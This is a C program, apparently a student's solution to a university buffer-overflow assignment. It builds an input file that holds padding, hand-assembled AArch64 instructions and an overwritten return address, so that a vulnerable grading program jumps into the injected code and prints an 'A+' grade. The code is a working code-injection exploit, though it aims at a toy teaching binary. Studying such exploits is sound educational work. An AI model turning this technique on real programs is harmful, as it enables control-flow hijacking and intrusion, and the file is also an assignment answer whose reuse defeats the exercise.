/* Authors: Rohan Amin and Alex Luo 
   createdataAplus.c */
#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, strb, branch, mov2;
   unsigned long movLocation;
   psFile = fopen("dataAplus", "w");
   fputs("Rolex",psFile);

   for (i = 0; i < 3; i++)
      putc('\0', psFile);

   adr = MiniAssembler_adr(0, 0x40095e, 0x420060);
   mov = MiniAssembler_mov(1, '%');
   strb = MiniAssembler_strb(1, 0);
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);

   adr = MiniAssembler_adr(0, 0x40095f, 0x42006c);
   mov = MiniAssembler_mov(1, 'c');
   strb = MiniAssembler_strb(1,0);
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);    
   
   // printf parameters  
   adr = MiniAssembler_adr(0, 0x40095e, 0x420078); 
   mov = MiniAssembler_mov(1, 'A');
   mov2 = MiniAssembler_mov(2, '+');
   branch = MiniAssembler_b(0x400874,0x420084);  
   movLocation = 0x420060; 
      
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&mov2, sizeof(unsigned int), 1, psFile); 
   fwrite(&branch, sizeof(unsigned int), 1, psFile);
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile);
   fclose(psFile);
   return 0;

}
